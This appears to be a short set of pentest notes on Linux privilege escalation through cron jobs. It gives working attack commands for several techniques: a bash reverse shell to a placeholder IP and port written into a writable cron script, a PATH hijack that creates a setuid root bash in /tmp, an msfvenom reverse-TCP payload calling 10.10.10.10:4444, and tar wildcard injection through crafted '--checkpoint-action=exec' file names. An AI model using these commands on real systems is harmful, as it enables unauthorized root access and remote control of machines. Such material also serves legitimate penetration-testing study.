You can replace to contents of a script that is running with a payload

View crontab contents: `cat /etc/crontab`

### File permissions

Replace executable file contents with this if it's writable: `#!/bin/bash` 
`bash -i >& /dev/tcp/[ip address]/[port number] 0>&1`
Than start a netcat listener and wait

### PATH variable

1. View what the path starts with in the crontab file
2. Create a file with the same name of executable file cron is running in this location with this script: `#!/bin/bash`  
`cp /bin/bash /tmp/rootbash`  
`chmod +xs /tmp/rootbash`
3. Run the file to get a persistent root shell: `/tmp/rootbash -p`

### Wildcards

#### tar

1. Generate a payload in your machine and get it to the target system: `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
2. Create those 2 files, tar will run those as valid commends and the file will be executed commands: `touch /home/user/--checkpoint=1`
`touch /home/user/--checkpoint-action=exec=shell.elf`
3. Start a netcat listener